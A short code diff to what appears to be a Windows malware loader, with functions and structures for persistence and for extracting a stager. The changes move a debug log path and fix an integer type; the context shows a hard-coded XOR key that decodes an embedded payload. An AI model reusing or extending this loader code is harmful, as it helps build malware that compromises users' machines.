@@ -241,10 +241,12 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 {
 
 #ifdef _DBG
-	std::string str_path("C:\\Users\\Public");
-	str_path.append("\\jldr.log");
-	SetLogPath(str_path.c_str());
-	
+	CHAR path[MAX_PATH];
+	if ( SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK ) {
+		std::string str_path(path);
+		str_path.append("\\jldr.log");
+		SetLogPath(str_path.c_str());
+	}
 #endif
 
 	persist_struct_ptr = (PERSIST_STRUCT *)calloc(1, sizeof(PERSIST_STRUCT));
@@ -443,7 +445,7 @@ bool ExtractStager( std::string passedPath){
 
 		//Decode XOR
 		char *xor_key = "\xa3\x45\x23\x06\xf4\x21\x42\x81\x72\x11\x92\x29";
-		int len = strlen(xor_key);
+		size_t len = strlen(xor_key);
 
 		//XOR the data
 		for( DWORD i = 0; i < dwSizeRes; i++ )
